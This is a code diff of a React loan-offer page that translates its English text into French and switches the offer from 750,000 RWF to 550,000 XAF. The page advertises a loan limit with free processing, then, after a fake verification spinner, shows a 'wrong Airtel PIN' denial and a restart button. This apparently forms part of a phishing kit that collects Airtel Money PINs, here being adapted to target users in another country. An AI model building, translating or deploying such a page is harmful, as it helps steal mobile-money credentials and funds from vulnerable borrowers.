@@ -140,31 +140,31 @@ export default function LoanLimitPage() {
       </button>
 
       {/* Loan Limit Section */}
-      <h2 className="text-2xl sm:text-4xl font-black text-black mb-2 sm:mb-4">Your Loan Limit</h2>
-      <p className="text-gray-500 text-sm sm:text-lg mb-8 sm:mb-12">Here is the amount you can borrow</p>
+      <h2 className="text-2xl sm:text-4xl font-black text-black mb-2 sm:mb-4">Votre plafond de prêt</h2>
+      <p className="text-gray-500 text-sm sm:text-lg mb-8 sm:mb-12">Voici le montant que vous pouvez emprunter</p>
 
       {/* Loan Amount Card */}
       <div className="bg-gradient-to-br from-red-50 to-red-100 border-2 border-red-400 rounded-2xl sm:rounded-3xl p-8 sm:p-12 mb-8 sm:mb-12 text-center">
-        <p className="text-gray-600 text-sm sm:text-base mb-3 sm:mb-4">Available Loan Amount</p>
+        <p className="text-gray-600 text-sm sm:text-base mb-3 sm:mb-4">Montant du prêt disponible</p>
         <div className="flex items-center justify-center gap-2 mb-2">
-          <h3 className="text-4xl sm:text-5xl font-black text-black">750,000</h3>
+          <h3 className="text-4xl sm:text-5xl font-black text-black">550,000</h3>
         </div>
-        <p className="text-gray-600 text-base sm:text-lg">RWF</p>
+        <p className="text-gray-600 text-base sm:text-lg">XAF</p>
       </div>
 
       {/* Details Section */}
       <div className="space-y-4 mb-8 sm:mb-12">
         <div className="flex justify-between items-center p-4 bg-gray-50 rounded-lg border border-gray-200">
-          <span className="text-gray-600 font-semibold text-sm sm:text-base">Loan Term</span>
-          <span className="text-black font-bold text-sm sm:text-base">12 months</span>
+          <span className="text-gray-600 font-semibold text-sm sm:text-base">Durée du prêt</span>
+          <span className="text-black font-bold text-sm sm:text-base">12 MOIS</span>
         </div>
         <div className="flex justify-between items-center p-4 bg-gray-50 rounded-lg border border-gray-200">
-          <span className="text-gray-600 font-semibold text-sm sm:text-base">Interest Rate</span>
+          <span className="text-gray-600 font-semibold text-sm sm:text-base">Taux d’intérêt</span>
           <span className="text-black font-bold text-sm sm:text-base">13%</span>
         </div>
         <div className="flex justify-between items-center p-4 bg-gray-50 rounded-lg border border-gray-200">
-          <span className="text-gray-600 font-semibold text-sm sm:text-base">Processing Fee</span>
-          <span className="text-black font-bold text-sm sm:text-base">Free</span>
+          <span className="text-gray-600 font-semibold text-sm sm:text-base">Frais de traitement</span>
+          <span className="text-black font-bold text-sm sm:text-base">Gratuit</span>
         </div>
       </div>
 
@@ -173,7 +173,7 @@ export default function LoanLimitPage() {
         onClick={handleContinue}
         disabled={isProcessing}
         className="w-full bg-red-400 text-black font-bold text-base sm:text-xl py-3 sm:py-4 rounded-lg sm:rounded-2xl flex items-center justify-center gap-2 sm:gap-3 hover:bg-red-500 transition-colors disabled:bg-gray-300 disabled:cursor-not-allowed">
-        {isProcessing ? 'Processing...' : 'Continue to Get Loan'}
+        {isProcessing ? 'Traitement en cours…...' : 'Continuer pour obtenir le prêt'}
         <ArrowRight className="w-5 h-5 sm:w-6 sm:h-6" />
       </button>
 
@@ -182,9 +182,9 @@ export default function LoanLimitPage() {
         <div className="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50">
           <div className="bg-white rounded-2xl sm:rounded-3xl p-8 sm:p-12 max-w-sm w-full shadow-2xl text-center">
             <Loader className="w-12 h-12 sm:w-16 sm:h-16 text-red-600 animate-spin mx-auto mb-4" />
-            <h3 className="text-xl sm:text-2xl font-black text-black mb-3">Processing</h3>
+            <h3 className="text-xl sm:text-2xl font-black text-black mb-3">Traitement en cours…</h3>
             <p className="text-gray-500 text-sm sm:text-base">
-              Please wait while we verify your loan request...
+              Veuillez patienter pendant que nous vérifions votre demande de prêt…
             </p>
           </div>
         </div>
@@ -206,15 +206,15 @@ export default function LoanLimitPage() {
               </div>
             </div>
 
-            <h3 className="text-xl sm:text-2xl font-black text-black text-center mb-2">Wrong Pin Entered</h3>
+            <h3 className="text-xl sm:text-2xl font-black text-black text-center mb-2">Code PIN incorrect</h3>
             <p className="text-gray-500 text-sm sm:text-base text-center mb-6 sm:mb-8">
-              Your loan request has been denied. Please check your Airtel Pin and try again.
+              Votre demande de prêt a été refusée. Veuillez vérifier votre code PIN Airtel et réessayer.
             </p>
 
             <button 
               onClick={handleRestart}
               className="w-full bg-red-400 text-black font-bold text-base sm:text-lg py-3 sm:py-4 rounded-lg sm:rounded-2xl hover:bg-red-500 transition-colors">
-              Restart
+              Redémarrer
             </button>
           </div>
         </div>
